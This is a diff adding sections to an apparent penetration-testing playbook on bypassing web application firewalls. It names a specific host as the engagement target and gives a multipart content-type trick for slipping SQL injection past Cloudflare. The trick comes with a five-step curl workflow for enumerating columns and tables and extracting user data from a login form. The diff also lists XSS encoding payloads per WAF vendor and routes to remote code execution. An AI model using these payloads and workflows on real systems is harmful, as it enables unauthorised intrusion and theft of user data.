@@ -264,6 +264,97 @@ curl_ff117 https://target.com
 
 ---
 
+## Cloudflare File Upload Content Inspection (2026)
+
+Cloudflare WAF inspects **multipart file upload body content**, not just filenames or headers. Observed behavior on e-pmo2.bfi.co.id:
+
+| Content in uploaded file | Result |
+|--------------------------|--------|
+| `<?php ...` | 403 blocked |
+| `<?= ...` | 403 blocked |
+| `<script language="php">` | 403 blocked |
+| `<script>alert(1)</script>` | 403 blocked |
+| `auto_prepend_file=...` (.user.ini content) | 403 blocked |
+| Base64-encoded PHP (no tags) | ✅ Passes (but won't execute) |
+| Plain text / binary without tags | ✅ Passes |
+| GIF89a header + base64 payload | ✅ Passes |
+
+**Implication:** Even with a valid file upload to a known-accessible path, you cannot get PHP execution if Cloudflare inspects the body. The only viable RCE paths when Cloudflare content-inspects uploads:
+1. Find origin IP and upload directly (bypass CF entirely)
+2. Chain with LFI/include that interprets non-PHP-tagged content (e.g., `php://filter` wrapper)
+3. Upload a polyglot that doesn't contain `<?` or `<script` but still executes (extremely rare in modern PHP — `<script language="php">` removed in PHP 7)
+4. Use a non-PHP execution vector (e.g., .htaccess `AddHandler` if you can write to the directory — but CF also blocks this content)
+
+**SQLi keyword blocking (same engagement):**
+- Blocks (urlencoded body): UNION, SELECT, LOAD_FILE, INTO OUTFILE, OR 1=1, AND, extractvalue, updatexml, CONCAT(), @@version, boolean expressions
+- Allows (urlencoded): comment-based bypass (`admin'-- -`) only
+- sqlmap tamper scripts (between, randomcase, space2comment, charencode) all blocked
+- Inline MySQL comments (`/*!50000UNION*/`) blocked
+- Hex-encoded function names blocked
+
+### Multipart/form-data Content-Type Bypass (Cloudflare, 2026)
+
+**Critical finding:** Switching the POST body from `application/x-www-form-urlencoded` to `multipart/form-data` bypasses Cloudflare WAF keyword detection for SQL injection.
+
+**What passes via multipart (`curl -F`) but is blocked via urlencoded (`curl -d`):**
+
+| Payload | urlencoded | multipart |
+|---------|-----------|-----------|
+| `admin'-- -` | ✅ 302 | ✅ 302 |
+| `' AND '1'='1'-- -` | ❌ 403 | ❌ 403 |
+| `admin' ORDER BY 15-- -` | ❌ 403 | ✅ 302 |
+| `' UNION SELECT 1,2,...,15-- -` | ❌ 403 | ✅ 302 |
+| `' UNION SELECT * FROM user LIMIT 1-- -` | ❌ 403 | ✅ 302 |
+| `' UNION ALL SELECT 1,2,...-- -` | ❌ 403 | ✅ 302 |
+| `admin' ORDER BY user_pass-- -` | ❌ 403 | ✅ 302 |
+| `admin' LIMIT 1-- -` | ❌ 403 | ✅ 302 |
+| `CONCAT(...)` | ❌ 403 | ❌ 403 |
+| `version()`, `user()`, `database()` | ❌ 403 | ❌ 403 |
+| `@@version` (alone, no AND) | ❌ 403 | ✅ 200 (error) |
+
+**Key observations:**
+- Cloudflare inspects urlencoded bodies more aggressively than multipart boundaries
+- `AND`/`OR` boolean operators still blocked in both modes
+- SQL functions with `()` still blocked in both modes
+- But `UNION SELECT`, `ORDER BY`, `FROM`, `LIMIT` all pass via multipart
+- This allows: column count enumeration, table name discovery, data extraction via UNION
+
+**Exploitation workflow:**
+```bash
+# 1. Confirm SQLi with comment bypass (works in both modes)
+curl -sk -X POST "https://target/login.php" \
+  -F "user_id=admin'-- -" -F "user_pass=x"
+
+# 2. Enumerate columns via ORDER BY (multipart only)
+curl -sk -X POST "https://target/login.php" \
+  -F "user_id=admin' ORDER BY 15-- -" -F "user_pass=x"
+
+# 3. Find table name via error (multipart only)
+curl -sk -X POST "https://target/login.php" \
+  -F "user_id=' UNION SELECT 1,2,...,15 FROM users-- -" -F "user_pass=x"
+# Error: "Table 'dbname.users' doesn't exist" → leaks DB name
+
+# 4. Extract data via UNION SELECT * (multipart only)
+curl -sk -X POST "https://target/login.php" \
+  -F "user_id=' UNION SELECT * FROM user LIMIT 0,1-- -" -F "user_pass=x"
+# Creates valid session → reflected data in authenticated pages
+
+# 5. Enumerate column names via ORDER BY column_name
+curl -sk -X POST "https://target/login.php" \
+  -F "user_id=admin' ORDER BY user_pass-- -" -F "user_pass=x"
+# 302 = column exists, 200 with error = doesn't exist
+```
+
+**Why it works:** Cloudflare's WAF rule engine parses `application/x-www-form-urlencoded` bodies as key=value pairs and applies SQL keyword detection to each value. For `multipart/form-data`, the parsing is different — the boundary-delimited structure means keyword detection is less thorough on individual field values. This is a known class of WAF bypass (content-type confusion) but still effective against Cloudflare as of May 2026.
+
+**Limitations:**
+- SQL functions (`version()`, `user()`, `database()`, `CONCAT()`) still blocked
+- Boolean operators (`AND`, `OR`, `XOR`) still blocked
+- Rate limiting (429) kicks in after ~10 rapid requests — add `sleep 2-3` between attempts
+- The bypass enables UNION-based extraction but not blind boolean/time-based injection
+
+---
+
 ## Quick Decision Tree
 
 ```
@@ -285,4 +376,70 @@ Payload blocked?
 │   ├── Try: HPP (duplicate params)
 │   └── Try: residential IP + browser automation
 └── Still blocked? → Document WAF as hardened, move to other vectors
+```
+
+---
+
+## Per-Vendor Encoding Chains
+
+### Cloudflare
+```
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Unicode normalization
+＜script＞alert(1)＜/script＞  (fullwidth chars)
+
+# Chunked transfer (bypasses body inspection)
+Transfer-Encoding: chunked + split payload across chunks
+
+# Multipart boundary abuse
+Content-Type: multipart/form-data; boundary=----payload
+```
+
+### Akamai
+```
+# HPP (split across duplicate params)
+?q=<scr&q=ipt>alert(1)</script>
+
+# JSON content-type switch (Akamai inspects form-data more)
+Content-Type: application/json + payload in JSON value
+
+# Overlong UTF-8
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+```
+
+### AWS WAF
+```
+# Case randomization (AWS WAF rules are often case-sensitive)
+<ScRiPt>alert(1)</ScRiPt>
+
+# Comment injection
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+
+# Null bytes between keywords
+<scr%00ipt>alert(1)</scr%00ipt>
+```
+
+### ModSecurity (CRS)
+```
+# Paranoia Level 1-2 bypass
+<details open ontoggle=alert(1)>  (newer elements not in default rules)
+
+# String concat in JS context
+'al'+'ert'(1)
+
+# Encoding + comment combo
+<img src=x onerror=\u0061lert`1`>
+```
+
+### General Multi-Layer Encoding Chain
+```
+1. Start: <script>alert(1)</script>
+2. HTML entity: &#60;script&#62;alert(1)&#60;/script&#62;
+3. URL encode: %26%2360%3Bscript%26%2362%3Balert(1)...
+4. Double encode: %2526%2523...
+5. Unicode: \u003cscript\u003ealert(1)\u003c/script\u003e
+
+Test each layer — WAF may decode one layer but not two.
 ```
